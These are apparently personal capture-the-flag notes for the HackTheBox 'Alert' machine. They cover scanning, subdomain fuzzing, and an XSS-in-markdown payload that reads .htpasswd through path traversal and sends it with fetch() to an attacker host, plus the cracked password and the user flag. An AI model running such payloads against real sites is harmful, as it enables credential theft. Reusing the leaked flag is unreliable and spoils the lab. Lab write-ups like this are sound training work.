
HTB : [[Machines]]

**Date:** 10/01/25  
**Target IP:** 10.10.11.44

---
### **Initial Scanning**

#### **Nmap**

- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

---
### **Exploration and Enumeration**

Navigated to `alert.htb` on Port 80 and I'm presented with 4 pages :
- Markdown Viewer ( http://alert.htb/index.php?page=alert )
- Contact Page with a form.
- About Us Page
- Donate Page with a form that doesn't work.

On submitting a demo .md file we are sent to /visualizer.php where we can view the parsed markdown and are provided an option to obtain a shareable link to the parsed markdown. 

Initial inclination is that a file upload vulnerability is present.

#### **Subdomain Enumeration**

``` bash
❯ ffuf -u http://alert.htb/ -H "Host: FUZZ.alert.htb" -w /usr/share/wordlists/subdomains-10000.txt -ac
```

```bash
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 209ms]
```

Here is where everything went beyond my abilities.

---
### **Exploitation**

The following solution for Exploitation and Gaining Access was obtained from a write-up.

JavaScript payloads may be embedded within .md files. We can utilize this to read sensitive files on the web server. Since the web server is Apache and hosting a website written in .php, the sensitive file of interest should be ***.htpasswd***.

Attempting to make the webpage reflect the contents of a sensitive file is not possible due to the way the webpage is displaying the parsed markdown text. Hence, an alternative to this can be adopted in the way of exfiltrating the contents to an HTTP server set up on the attacking machine.

This can be achieved through uploading the following `test.md` file :

``` js
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://<attacker_ip>:8888/?text=" + encodeURIComponent(data));
  });
</script>
```

Here, we call the statistics subdomain discovered earlier as the standard domain does not provide us with the necessary response.

Viewing the above on the webpage triggers the following response on our HTTP server :

```
10.10.14.63 - - [10/Jan/2025 15:35:07] "GET /?text=%0A HTTP/1.1" 200 -
```

We can then enter the share link functionality on the website and submit the obtained share link into the contact form which causes the following response to be sent to our HTTP server :

```
10.10.11.44 - - [10/Jan/2025 16:27:12] "GET /?text=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
```

We obtain the following credentials after URL decoding and cracking the hash : 

**albert : manchesterunited**

I can now SSH into this user and obtain the **user flag** :

**6b8a1491b31410fd81c62609bff78c3d**

---
### **Post-Exploitation**



---
### **Summary**

- Albert User Credentials : `albert : manchesterunited`
- User Flag ( `/home/albert/user.txt` ) : **6b8a1491b31410fd81c62609bff78c3d**
- 






